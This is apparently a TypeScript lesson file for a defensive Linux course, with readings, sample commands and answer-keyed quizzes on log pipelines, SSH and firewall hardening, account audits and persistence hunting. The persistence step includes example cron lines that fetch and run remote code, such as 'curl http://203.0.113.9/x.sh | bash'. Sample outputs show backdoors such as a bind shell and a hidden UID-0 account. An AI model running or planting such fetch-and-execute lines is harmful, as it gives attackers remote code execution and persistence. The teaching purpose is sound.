import type { Level } from '../types'

const level: Level = {
  id: 'amateur',
  title: 'Reading the system and hardening it',
  summary:
    'You know the shell. Now turn logs into answers with pipelines, read systemd journals, control services, and harden the two things attackers hit first: SSH and the firewall. Then hunt for persistence.',
  outcomes: [
    'Redirect and pipe output to build log pipelines',
    'Extract fields with cut and awk, and rank with sort | uniq -c',
    'Read logs with journalctl and manage services with systemctl',
    'Harden SSH and stand up a default-deny firewall',
    'Audit accounts and sudo access',
    'Find scheduled tasks and spot persistence',
  ],
  steps: [
    {
      id: 'blin-a-01',
      title: 'Redirection: capturing and separating output',
      read: `The shell wires programs together through three **streams**: standard input (**stdin**, 0), standard output (**stdout**, 1) and standard error (**stderr**, 2). Controlling where they go is the basis of every log pipeline.

- \`command > file\` — send stdout to a file, **overwriting** it
- \`command >> file\` — **append** stdout to a file (keeps history — what you want for a log)
- \`command 2> errors.txt\` — send stderr to a file
- \`command > out.txt 2>&1\` — send both stdout and stderr to one file (\`2>&1\` = "stderr, go where stdout goes")
- \`command 2>/dev/null\` — throw errors away (\`/dev/null\` is the bin)
- \`command | other\` — pipe stdout into another command

## Why a defender cares

You constantly save evidence and suppress noise. \`sudo find / -perm -4000 2>/dev/null\` hunts for something across the whole disk while discarding the "permission denied" noise into the bin, leaving only the real hits. And \`>>\` versus \`>\` matters: overwrite your evidence file by accident and it is gone.

## Order matters

\`> file 2>&1\` works; \`2>&1 > file\` does not do the same thing, because redirections are read left to right. Put the file first, then point stderr at it.`,
      sample: {
        lang: 'bash',
        caption: 'Suppressing noise to see only the real findings',
        code: `# without suppression: real hits buried in "Permission denied"
find / -perm -4000 -type f 2>/dev/null

# save a timestamped record instead of printing it
echo "$(date) checkup by $(whoami)" >> /home/student/audit.log`,
        output: `/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su`,
      },
      question: {
        kind: 'mcq',
        prompt: 'What does `2>/dev/null` do on the end of a command?',
        options: [
          'Sends the normal output to a file',
          'Discards error messages (stderr), so only real results remain on screen',
          'Runs the command twice',
          'Redirects input from a file',
        ],
        answer: 1,
        explain:
          '`2>` redirects stderr, and `/dev/null` discards whatever is sent to it. So `2>/dev/null` throws away error noise — invaluable when searching the whole filesystem, where "Permission denied" would otherwise drown the real hits.',
        hint: 'Stream 2 is errors; /dev/null is the bin.',
      },
    },

    {
      id: 'blin-a-02',
      title: 'Pulling fields out of logs with cut and awk',
      read: `Log lines are structured. To count or rank, you first extract the field you care about.

## cut — simple, delimiter-based

\`cut -d' ' -f1\` splits on a space and keeps field 1. \`cut -d: -f1 /etc/passwd\` pulls every username (fields split by \`:\`). Fast when the delimiter is consistent.

## awk — a small language for columns

\`awk '{print $1}'\` prints the first whitespace-separated field; \`$0\` is the whole line, \`$NF\` is the last field. It handles runs of spaces gracefully (where \`cut\` struggles) and can filter:

\`\`\`
awk '$9 == 404 {print $7}' access.log
\`\`\`

"For every request that returned 404, print the URL." \`awk\` is the defender's scalpel for structured logs.

## Putting it to work

An SSH failure line ends with \`... from 203.0.113.9 port 55210 ssh2\`. To get just the attacking IP you can grep the failures and \`awk\` out the field after \`from\`. Once each line becomes a single IP, you can count them (next step).

> You do not need to master awk. Learn \`awk '{print $N}'\` to grab a column, and \`awk '/pattern/ {...}'\` to act on matching lines. That covers most log work.`,
      sample: {
        lang: 'bash',
        caption: 'Turning failed-login lines into a clean list of attacker IPs',
        code: `grep "Failed password" /var/log/auth.log \\
  | awk '{for (i=1;i<=NF;i++) if ($i=="from") print $(i+1)}' \\
  | head -4`,
        output: `203.0.113.9
203.0.113.9
198.51.100.4
203.0.113.9`,
      },
      question: {
        kind: 'fill',
        prompt:
          'The file `/etc/passwd` has colon-separated fields, and the username is the first. Write an `awk` command (reading that file) that prints just the usernames.',
        placeholder: "awk -F ...",
        accept: [
          "awk -F: '{print $1}' /etc/passwd",
          'awk -F: "{print $1}" /etc/passwd',
          "awk -F ':' '{print $1}' /etc/passwd",
          "awk -F\":\" '{print $1}' /etc/passwd",
        ],
        explain:
          '`-F:` sets the field separator to a colon, and `{print $1}` prints the first field — the username. (`cut -d: -f1 /etc/passwd` does the same job.)',
        hint: 'Set the field separator with -F: and print field $1.',
      },
    },

    {
      id: 'blin-a-03',
      title: 'The top-talkers idiom: sort | uniq -c | sort -rn',
      read: `This one pipeline answers a huge share of defensive questions: **"what is happening most, and from where?"** Learn it as a single reflex.

\`\`\`
... | sort | uniq -c | sort -rn | head
\`\`\`

Read it right to left in effect:

1. \`sort\` — group identical lines together (required, because...)
2. \`uniq -c\` — collapse adjacent duplicates and **prefix each with its count**. It only collapses *adjacent* lines, which is why you must \`sort\` first.
3. \`sort -rn\` — sort by that count, **r**everse (biggest first), **n**umeric (so 100 beats 99, which text sort gets wrong)
4. \`head\` — just the top few

## What it tells a defender

Feed it attacker IPs → the worst brute-forcers. Feed it requested URLs from a web log → what is being scanned for. Feed it usernames from failed logins → which accounts are targeted. It converts a flood of raw lines into a ranked leaderboard of "what to worry about first".

## The numeric-sort trap

Without \`-n\`, sort compares as text, so \`9\` sorts after \`100\` (because "9" > "1" character-wise). Any time you rank counts, use \`sort -rn\`.`,
      sample: {
        lang: 'bash',
        caption: 'The worst brute-forcing IPs, ranked, in one line',
        code: `grep "Failed password" /var/log/auth.log \\
  | grep -oE "from [0-9.]+" | awk '{print $2}' \\
  | sort | uniq -c | sort -rn | head -5`,
        output: `    901 203.0.113.9
    212 198.51.100.4
     71 192.0.2.77
     14 203.0.113.50
      3 198.51.100.23`,
      },
      question: {
        kind: 'mcq',
        prompt: 'Why must you run `sort` before `uniq -c`?',
        options: [
          '`uniq` needs the input alphabetised for display',
          '`uniq` only collapses *adjacent* duplicate lines, so identical lines must be brought together first',
          '`sort` removes errors',
          'It is not necessary; the order is optional',
        ],
        answer: 1,
        explain:
          '`uniq` compares each line only to the one before it, so it can merge duplicates only when they are already adjacent. `sort` guarantees that. Skip the sort and `uniq -c` gives wrong, fragmented counts.',
        hint: 'uniq only looks at neighbouring lines.',
      },
    },

    {
      id: 'blin-a-04',
      title: 'journalctl: the systemd journal',
      read: `Modern Linux (anything with **systemd**) keeps a central binary log you read with **journalctl**. It captures the kernel, services and more, all timestamped and filterable — often richer than the plain-text files in \`/var/log\`.

## The flags that matter

- \`journalctl -e\` — jump to the end (newest)
- \`journalctl -f\` — follow live (like \`tail -f\`)
- \`journalctl -u ssh\` — only the \`ssh\` service's logs
- \`journalctl -k\` — kernel messages
- \`journalctl --since "1 hour ago"\` / \`--since today\` / \`--since "2024-06-01 09:00"\` — time windows
- \`journalctl -p err\` — only errors and worse (priority filter)
- \`journalctl _UID=1000\` — everything a specific user's processes logged

## Why a defender lives here

You can ask precise questions: "show me the SSH service's errors in the last hour" is \`journalctl -u ssh -p err --since "1 hour ago"\`. Filtering by service, time and severity at once is exactly how you cut a breach investigation down to the relevant lines.

## Persistence of the journal

By default the journal may be volatile (lost on reboot). On a system you defend, ensure it is persistent (\`/var/log/journal\` exists) so evidence survives a restart — attackers reboot boxes to clear volatile logs.`,
      sample: {
        lang: 'bash',
        caption: 'A focused question answered with one journalctl call',
        code: `journalctl -u ssh --since "today" -p warning | tail -5`,
        output: `Jun 01 09:41:02 lab sshd[2011]: Failed password for root from 203.0.113.9 port 55210 ssh2
Jun 01 09:41:44 lab sshd[2011]: error: maximum authentication attempts exceeded for root
Jun 01 09:42:10 lab sshd[2015]: Disconnecting authenticating user root: too many failures
Jun 01 10:02:33 lab sshd[2040]: Invalid user admin from 198.51.100.4 port 40122
Jun 01 10:02:34 lab sshd[2040]: Failed password for invalid user admin from 198.51.100.4`,
      },
      question: {
        kind: 'code',
        lang: 'bash',
        prompt:
          'Write a journalctl command that shows only the `ssh` service’s logs from the last hour.',
        starter: 'journalctl ',
        mustInclude: ['journalctl', '-u\\s+ssh(d)?', '--since'],
        accept: [
          'journalctl -u ssh --since "1 hour ago"',
          'journalctl -u sshd --since "1 hour ago"',
          "journalctl -u ssh --since '1 hour ago'",
        ],
        solution: 'journalctl -u ssh --since "1 hour ago"',
        explain:
          '`-u ssh` restricts to the SSH unit and `--since "1 hour ago"` sets the window. Combining a service filter with a time filter is the core move for scoping an investigation.',
        hint: 'You need the -u (unit) filter and the --since (time) filter together.',
      },
    },

    {
      id: 'blin-a-05',
      title: 'Services: what is running and should it be',
      read: `A **service** (systemd calls it a **unit**) is a background program the system manages — SSH, a web server, a database. Every listening service is attack surface, so a defender audits them.

## systemctl

- \`systemctl status ssh\` — is it running, since when, recent log lines
- \`systemctl list-units --type=service --state=running\` — everything running now
- \`systemctl list-unit-files --state=enabled\` — everything set to start at boot
- \`systemctl stop / start / restart ssh\` — control it now
- \`systemctl disable / enable ssh\` — control whether it starts at boot

**Stop** affects now; **disable** affects boot. To turn something off for good you usually want both (\`systemctl disable --now foo\`).

## The defensive audit

Ask of every enabled service: *do we actually need this?* A database listening on the network "because it came that way", an old print service, a debug daemon — each is code an attacker can target. The strongest, simplest hardening is **turn off what you do not use**. Fewer services, smaller attack surface.

## Cross-check with listening ports

\`ss -tulpn\` lists every port something is listening on, and which program. Every open port should map to a service you meant to run. An unexplained listener is a serious finding — it can be a backdoor.`,
      sample: {
        lang: 'bash',
        caption: 'Every listening port mapped to its program — one unexpected',
        code: `sudo ss -tulpn`,
        output: `Netid State  Local Address:Port  Process
tcp   LISTEN 0.0.0.0:22          users:(("sshd",pid=880))
tcp   LISTEN 127.0.0.1:5432      users:(("postgres",pid=1201))
tcp   LISTEN 0.0.0.0:80          users:(("nginx",pid=1440))
tcp   LISTEN 0.0.0.0:4444        users:(("bash",pid=4102))   <- bash listening on 4444?!`,
      },
      question: {
        kind: 'mcq',
        prompt:
          '`ss -tulpn` shows `bash` listening on port 4444. What should a defender conclude?',
        options: [
          'Normal — bash often listens on ports',
          'Highly suspicious — a shell listening on a network port is a classic backdoor / bind shell; investigate the process and its parent immediately',
          'It is the SSH service',
          'Port 4444 is always safe',
        ],
        answer: 1,
        explain:
          'Legitimate services listen on ports; a plain shell does not. `bash` bound to 4444 is a textbook bind shell an attacker left to reconnect. Every listening port should trace to a service you intended — one that does not is a top-priority finding.',
        hint: 'Should the bash shell ever be accepting network connections?',
      },
    },

    {
      id: 'blin-a-06',
      title: 'Hardening SSH',
      read: `**SSH** (port 22) is how you administer Linux remotely — and therefore the single most attacked service on the internet. Hardening it is one of the highest-value things you will do. The config is \`/etc/ssh/sshd_config\`; after editing, apply with \`sudo systemctl restart ssh\`.

## The changes that matter most

- \`PermitRootLogin no\` — never allow direct root login. Attackers guess \`root\` first; deny it and they must guess a *valid* username too.
- \`PasswordAuthentication no\` — use **SSH keys** instead of passwords. A key is effectively unguessable; a password is brute-forceable. This one change ends password brute-forcing entirely.
- \`PubkeyAuthentication yes\` — enable key-based login (set up your key first, or you lock yourself out).
- \`AllowUsers alice bob\` — allow only named accounts to SSH in.
- \`MaxAuthTries 3\` — cut off guessing quickly.
- \`Protocol 2\` (default now) and modern ciphers only.

## The golden rule

**Before** turning off password auth, confirm your key works in a *second* session. Lock yourself out of a remote box and you have a very bad day. Test, then tighten.

## Keys, briefly

\`ssh-keygen -t ed25519\` makes a keypair. The **public** key goes into \`~/.ssh/authorized_keys\` on the server; the **private** key stays on your laptop, \`chmod 600\`, and never leaves it. Possession of the private key is what proves who you are.`,
      sample: {
        lang: 'text',
        caption: '/etc/ssh/sshd_config — the defensive baseline',
        code: `# /etc/ssh/sshd_config  (restart ssh after editing)
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
AllowUsers student
LoginGraceTime 20
# apply:  sudo systemctl restart ssh`,
        output: `With PasswordAuthentication no, the brute-force flood in auth.log
stops mattering: there is no password to guess.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Which single SSH setting does the most to end password brute-force attacks against the server?',
        options: [
          '`MaxAuthTries 3`',
          '`PasswordAuthentication no` (require SSH keys instead)',
          '`LoginGraceTime 20`',
          '`Port 2222`',
        ],
        answer: 1,
        explain:
          'If there is no password to guess, brute-forcing is pointless. Requiring keys makes credentials effectively unguessable. The others help (fewer tries, faster cutoff, less noise) but only key auth removes the attack outright. Always confirm your key works before disabling passwords.',
        hint: 'What can an attacker not brute-force if it does not exist?',
      },
    },

    {
      id: 'blin-a-07',
      title: 'The firewall: default deny',
      read: `A **firewall** controls which network connections are allowed. The defensive principle is **default deny**: block everything, then allow only the few things you truly need. Ubuntu ships **ufw** ("uncomplicated firewall") as a friendly front-end to the kernel's netfilter.

## Standing one up

\`\`\`
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp        # SSH, or you lock yourself out
sudo ufw enable
sudo ufw status verbose
\`\`\`

Read that as: refuse all inbound, permit outbound, then poke exactly one hole for SSH. A web server would add \`ufw allow 80,443/tcp\`.

## Why default-deny is the whole game

An "allow the bad, permit the rest" firewall fails the moment something new appears. "Deny everything, permit the known-good" fails safe: a service you forgot about, or one an attacker starts, is blocked by default. You decide what is allowed; nothing else gets in.

## The lockout warning

The classic self-inflicted wound: enable the firewall on a remote box **without** allowing SSH first, and you cut your own connection with no way back in. Always \`allow 22\` before \`enable\`. Rate-limit it too — \`ufw limit 22/tcp\` throttles repeated connection attempts, blunting brute-force.

Under the hood this is \`iptables\`/\`nftables\`; ufw just makes the common cases readable. Knowing the rules exist, and that the default should be deny, is what matters.`,
      sample: {
        lang: 'bash',
        caption: 'A minimal default-deny firewall for an SSH + web host',
        code: `sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw limit 22/tcp
sudo ufw allow 80,443/tcp
sudo ufw enable
sudo ufw status verbose`,
        output: `Status: active
Default: deny (incoming), allow (outgoing)
To                         Action      From
22/tcp                     LIMIT       Anywhere
80,443/tcp                 ALLOW       Anywhere`,
      },
      question: {
        kind: 'fill',
        prompt:
          'Before enabling the firewall on a remote machine, which port must you allow so you don’t lock yourself out of your SSH session? (Just the number.)',
        placeholder: 'a port number',
        accept: ['22', 'port 22', '22/tcp'],
        explain:
          'SSH listens on port 22. Enable a default-deny firewall without allowing 22 first and you sever your own remote connection with no way back. `sudo ufw allow 22/tcp` before `ufw enable`, every time.',
        hint: 'It is the SSH port.',
      },
    },

    {
      id: 'blin-a-08',
      title: 'Auditing accounts and sudo',
      read: `Attackers want accounts — to log in as, and to escalate. A defender periodically audits **who exists, who can log in, and who can become root**.

## Who can actually log in

Not every account is a login. Real interactive users have a normal shell (\`/bin/bash\`); service accounts should have \`/usr/sbin/nologin\` or \`/bin/false\`. A *service* account with a real shell is a red flag — either a mistake or a foothold.

\`\`\`
grep -vE '/(nologin|false)$' /etc/passwd
\`\`\`

lists accounts that *can* log in. Every one should be a person you recognise.

## Who can become root

\`\`\`
getent group sudo        # members of the sudo group (Debian/Ubuntu)
sudo grep -rvE '^#|^$' /etc/sudoers /etc/sudoers.d/
\`\`\`

Anyone here can act as root. The list should be short and expected. Watch especially for \`NOPASSWD:\` entries (root without even a password prompt) and \`ALL=(ALL) ALL\` granted too widely.

## Locking down accounts

- \`sudo passwd -l alice\` — lock an account's password (cannot log in with it)
- \`sudo usermod -L alice\` / \`-U\` — lock / unlock
- \`sudo usermod -s /usr/sbin/nologin svc\` — take away a service account's shell
- \`sudo deluser bob\` — remove a departed user

## UID 0 duplicates

There should be exactly **one** account with UID 0 (root). An attacker who creates a second UID-0 account has effectively a hidden root. Check: \`awk -F: '$3==0{print $1}' /etc/passwd\` must return only \`root\`.`,
      sample: {
        lang: 'bash',
        caption: 'Two quick account audits — the second finds a backdoor',
        code: `# who can become root?
getent group sudo
# is there a SECOND uid-0 account? (there must not be)
awk -F: '$3==0 {print $1}' /etc/passwd`,
        output: `sudo:x:27:student,alice
root
toor          <- a second UID-0 account: a hidden root backdoor`,
      },
      question: {
        kind: 'mcq',
        prompt: 'Your check `awk -F: \'$3==0{print $1}\' /etc/passwd` returns both `root` and `toor`. What does this mean?',
        options: [
          'Normal — systems have several root accounts',
          '`toor` is a second account with UID 0, giving it full root power — almost certainly an attacker-created backdoor to investigate and remove',
          '`toor` is the recovery account and is safe',
          'The command is wrong',
        ],
        answer: 1,
        explain:
          'UID 0 *is* root, whatever the name. Any account with UID 0 has complete control, so a second one is a hidden root — a classic persistence trick. There must be exactly one UID-0 account. Investigate how `toor` was created (check logs) and remove it.',
        hint: 'What power does UID 0 carry, regardless of the account name?',
      },
    },

    {
      id: 'blin-a-09',
      title: 'Scheduled tasks and persistence',
      read: `When an attacker gets in, they want to **stay** in — "persistence". The most common trick on Linux is a **scheduled task** that re-runs their code on a timer or at boot. A defender knows every place a job can hide and checks them all.

## cron — the classic

- \`crontab -l\` — the current user's jobs
- \`sudo crontab -l\` — root's jobs
- \`for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null; done\` — every user's
- System-wide: \`/etc/crontab\`, \`/etc/cron.d/\`, and the \`/etc/cron.{hourly,daily,weekly,monthly}/\` directories

A cron line \`* * * * * curl http://evil/x | bash\` runs every minute, re-downloading and executing attacker code. Deleting the malware without removing the cron job means it comes straight back.

## systemd timers — the modern hiding spot

\`systemctl list-timers --all\` shows timer units. Attackers increasingly use these instead of cron because defenders forget to look. Each timer points at a service unit — check both.

## Other persistence spots to know

- \`~/.bashrc\`, \`/etc/profile.d/\` — code that runs on login
- \`/etc/rc.local\`, systemd services set to \`enable\` — code that runs at boot
- SSH \`authorized_keys\` — an attacker's key added here is silent re-entry

## The routine

After any suspected compromise, enumerate **all** of these. Persistence is what turns a one-off intrusion into an ongoing one, and it is often the thing incident responders miss.`,
      sample: {
        lang: 'bash',
        caption: 'Finding a malicious cron job hidden in root’s crontab',
        code: `sudo crontab -l
echo "--- system cron dirs ---"
ls -la /etc/cron.d/`,
        output: `* * * * * curl -s http://203.0.113.9/x.sh | bash   <- re-infects every minute
-rw-r--r-- 1 root root  120 Jun  1 09:20 .update    <- hidden file in cron.d`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'You remove a malware binary from a compromised box, but it reappears within a minute. What is the most likely explanation?',
        options: [
          'The disk is faulty',
          'A persistence mechanism — most likely a cron job or systemd timer — is re-downloading and re-running it on a schedule; you must find and remove that too',
          'You did not delete it properly',
          'Linux restores deleted files automatically',
        ],
        answer: 1,
        explain:
          'Malware that returns on a timer is being reinstalled by a persistence mechanism. Deleting the payload without removing the scheduled task is futile. Enumerate cron (all users, /etc/cron*), systemd timers, and login/boot hooks to find what is re-running it.',
        hint: 'What could be re-running the attacker’s code every minute?',
      },
    },

    {
      id: 'blin-a-10',
      title: 'Finding what changed with find',
      read: `After an incident — or as routine hygiene — you often ask "**what changed recently?**". \`find\` answers it, and much more. It walks the filesystem and matches on any attribute.

## Time-based hunting

- \`find /etc -mtime -1\` — files under /etc **modified** in the last day
- \`find / -mmin -30 -type f 2>/dev/null\` — files changed in the last 30 minutes
- \`find /var/www -newer /tmp/marker\` — changed since a reference point

If your web root changed at 3am and you did not deploy anything, that is your lead.

## Permission and ownership hunting

- \`find / -perm -4000 -type f 2>/dev/null\` — **SUID** files (run as their owner, often root — a privilege-escalation vector; the list should be short and standard)
- \`find / -perm -2 -type f 2>/dev/null\` — **world-writable** files (anyone can alter them)
- \`find / -nouser -o -nogroup 2>/dev/null\` — files owned by no valid account (a sign of a deleted attacker user)

## Combining and acting

\`find /tmp -name "*.sh" -mtime -1\` — recent shell scripts in /tmp (a favourite drop spot). Add \`-ls\` to see detail, or \`-exec\` to act on each hit (carefully).

## Why SUID matters

A SUID-root binary runs as root no matter who launches it. The standard set (\`sudo\`, \`passwd\`, \`mount\`…) is fine; an *unexpected* SUID binary — say a copy of \`bash\` — is a privilege-escalation backdoor. Baselining the SUID list on a clean box, then diffing later, catches this.`,
      sample: {
        lang: 'bash',
        caption: 'An unexpected SUID binary — instant root for anyone',
        code: `find / -perm -4000 -type f 2>/dev/null`,
        output: `/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/tmp/rootbash          <- a SUID copy of bash in /tmp: instant-root backdoor`,
      },
      question: {
        kind: 'code',
        lang: 'bash',
        prompt:
          'Write a `find` command that lists all files under `/etc` modified in the last 24 hours (use -mtime).',
        starter: 'find /etc ',
        mustInclude: ['find\\s+/etc', '-mtime\\s+-1'],
        accept: ['find /etc -mtime -1', 'find /etc -type f -mtime -1', 'find /etc -mtime -1 -type f'],
        solution: 'find /etc -mtime -1',
        explain:
          '`-mtime -1` matches files modified less than 1 day ago (the minus means "less than"). Pointing it at /etc surfaces config changes — exactly what you want to review after an incident or an unexpected change.',
        hint: '-mtime with a negative number means "within the last N days".',
      },
    },

    {
      id: 'blin-a-11',
      title: 'fail2ban: automating the block',
      read: `You cannot watch logs by hand 24/7. **fail2ban** does it for you: it reads log files, and when an IP crosses a threshold of failures, it adds a firewall rule to **ban** that IP for a while. It turns "a human notices the brute-force" into "the brute-force is blocked automatically".

## How it works

- A **filter** is a regex that recognises a failure line (there are built-ins for SSH, web servers, mail, etc.)
- A **jail** ties a filter to a log file and a policy: how many failures (\`maxretry\`), in what window (\`findtime\`), earn how long a ban (\`bantime\`)
- When triggered, fail2ban inserts a firewall block via an **action**

## A basic SSH jail

Edit \`/etc/fail2ban/jail.local\` (never \`jail.conf\` — updates overwrite it):

\`\`\`
[sshd]
enabled  = true
maxretry = 4
findtime = 10m
bantime  = 1h
\`\`\`

Four failures within ten minutes → banned for an hour. Repeat offenders can be banned for longer or permanently.

## Checking it

\`sudo fail2ban-client status sshd\` shows how many IPs are currently banned and the totals. Watching that number is oddly satisfying — it is the automated defence working.

## The bigger idea

fail2ban is your first taste of **automated response**: a control that not only detects but *acts*. Detection without response just produces alerts nobody reads; pairing them is what actually reduces risk. It is not a substitute for key-only SSH — but combined with it, the noise and the risk both drop hard.`,
      sample: {
        lang: 'bash',
        caption: 'fail2ban actively banning the brute-forcers from earlier',
        code: `sudo fail2ban-client status sshd`,
        output: `Status for the jail: sshd
|- Filter
|  |- Currently failed: 2
|  \`- Total failed:     1184
\`- Actions
   |- Currently banned: 3
   |- Total banned:     37
   \`- Banned IP list:   203.0.113.9 198.51.100.4 192.0.2.77`,
      },
      question: {
        kind: 'mcq',
        prompt: 'What does fail2ban add on top of simply reading logs for failed logins?',
        options: [
          'It encrypts the logs',
          'Automated *response* — when an IP crosses a failure threshold it automatically inserts a firewall ban, so detection turns into action without a human in the loop',
          'It replaces the need for SSH keys',
          'It makes logins faster',
        ],
        answer: 1,
        explain:
          'Reading logs is detection; fail2ban adds the response step, banning offending IPs at the firewall automatically. Detection without response is just unread alerts — coupling them is what reduces real risk. It complements key-only SSH rather than replacing it.',
        hint: 'Detection tells you; this also *does* something.',
      },
    },

    {
      id: 'blin-a-12',
      title: 'Project: harden a fresh box',
      read: `Combine the level into a **hardening checklist** — the pass you make on any new Linux host before it goes near a network. Order matters: do the things that lock you out *last*, and always after confirming a way back in.

The checklist:

1. **Patch** — \`apt update && apt upgrade\`. Start current.
2. **Accounts** — remove/lock unused accounts; confirm exactly one UID-0; take shells away from service accounts; review the sudo group.
3. **SSH keys first** — install your key, confirm login with it in a second session.
4. **Harden SSH** — \`PermitRootLogin no\`, \`PasswordAuthentication no\`, \`MaxAuthTries 3\`; restart; re-test.
5. **Firewall** — default deny inbound, allow only needed ports (SSH first!), \`ufw limit 22\`, enable.
6. **Services** — disable everything you do not use; cross-check \`ss -tulpn\` so every listener is intended.
7. **Automated response** — install and enable fail2ban for SSH.
8. **Baseline** — record the SUID list, listening ports, enabled services and cron jobs to a file, so later you can diff against "known good".

The last point is the one people skip and regret. A **baseline** of a clean system is what makes future detection possible — "what changed since the box was healthy?" is only answerable if you wrote down healthy.

> A hardened box is not one with a magic tool installed. It is one that is patched, runs little, exposes less, requires keys, blocks brute-force, and has a recorded baseline. Simple, boring, effective.`,
      sample: {
        lang: 'bash',
        caption: 'baseline.sh — record known-good state for later comparison',
        code: `#!/bin/bash
# Run on a CLEAN box; keep the output somewhere safe (off the box).
out="baseline-$(hostname)-$(date +%F).txt"
{
  echo "### SUID binaries ###"
  find / -perm -4000 -type f 2>/dev/null | sort
  echo "### listening ports ###"
  sudo ss -tulpn | sort
  echo "### enabled services ###"
  systemctl list-unit-files --state=enabled --type=service
  echo "### cron (all users) ###"
  for u in $(cut -d: -f1 /etc/passwd); do
    echo "-- $u --"; sudo crontab -l -u "$u" 2>/dev/null
  done
  echo "### uid-0 accounts (should be only root) ###"
  awk -F: '$3==0 {print $1}' /etc/passwd
} | tee "$out"
echo "Saved baseline to $out — store it off this machine."`,
        output: `### SUID binaries ###
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/sudo
### listening ports ###
tcp LISTEN 0.0.0.0:22 users:(("sshd",pid=880))
### uid-0 accounts (should be only root) ###
root
Saved baseline to baseline-lab-2024-06-01.txt — store it off this machine.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why record a baseline of SUID files, ports, services and cron jobs on a clean system?',
        options: [
          'It makes the system run faster',
          'Because detection is comparison — "what changed since the box was known-good?" can only be answered if you captured known-good; a later diff surfaces attacker additions',
          'It is required before you can enable the firewall',
          'Baselines encrypt the configuration',
        ],
        answer: 1,
        explain:
          'A baseline turns vague suspicion into a precise diff: a new SUID binary, an extra listening port, an unfamiliar cron job all jump out against the recorded clean state. Storing it off the box matters too — an attacker who owns the box could edit an on-box baseline.',
        hint: 'How do you know something is *new* if you never recorded the original?',
      },
    },
  ],
}

export default level
